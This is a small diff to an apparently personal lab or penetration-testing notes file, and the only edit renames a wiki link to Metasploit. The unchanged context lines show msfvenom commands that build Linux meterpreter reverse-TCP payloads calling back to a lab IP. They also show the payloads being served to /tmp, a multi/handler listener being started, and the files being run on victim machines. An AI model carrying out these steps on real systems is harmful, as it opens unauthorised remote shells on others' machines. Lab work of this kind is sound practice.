@@ -180,7 +180,7 @@ Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linu
 - `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shellDexter.elf LHOST=10.0.2.10 LPORT=1400`
 - `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shellTravis.elf LHOST=10.0.2.10 LPORT=1500`
 - made a python server. uploaded them both to the `/tmp` directory
-- started [[metasploit]]
+- started [[metasploit_framework]]
 - `use exploit/multi/handler`
 - set the proper ports, payloads and lport and ran the listeners
 - ran the files from the victim machines
